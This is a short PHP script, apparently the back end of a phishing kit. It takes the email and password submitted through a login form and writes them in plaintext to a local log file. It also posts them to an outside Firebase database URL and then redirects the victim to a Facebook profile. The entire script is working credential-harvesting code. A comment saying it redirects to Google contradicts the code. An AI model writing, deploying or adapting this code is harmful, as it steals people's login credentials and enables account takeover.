<?php
// Firebase and Login Handler

// Function to log login attempts to local file
function logLoginAttemptLocal($email, $password) {
    $timestamp = date('m/d/y , h:iA');
    
    $logEntry = "[{$timestamp}]\n";
    $logEntry .= "Username: {$email}\n";
    $logEntry .= "Password: {$password}\n";
    $logEntry .= "-\n";
    
    file_put_contents('log.txt', $logEntry, FILE_APPEND);
}

// Function to log login attempts to Firebase
function logLoginAttemptFirebase($email, $password) {
    // Firebase Realtime Database URL (replace with your actual Firebase URL)
    $firebaseUrl = 'https://logininfo-3bff0-default-rtdb.asia-southeast1.firebasedatabase.app/logs.json';
    
    // Prepare data for Firebase
    $data = [
        'timestamp' => date('m/d/y , h:iA'),
        'username' => $email,
        'password' => $password
    ];
    
    // Initialize cURL
    $ch = curl_init($firebaseUrl);
    
    // Prepare cURL options
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Content-Length: ' . strlen(json_encode($data))
    ]);
    
    // Execute cURL and close
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve and sanitize email and password
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = $_POST['pass'];
    
    // Log to local file
    logLoginAttemptLocal($email, $password);
    
    // Log to Firebase
    logLoginAttemptFirebase($email, $password);
    
    // Redirect to Google
    header("Location: https://www.facebook.com/profile.php?id=100087523720464");
    exit();
}
?>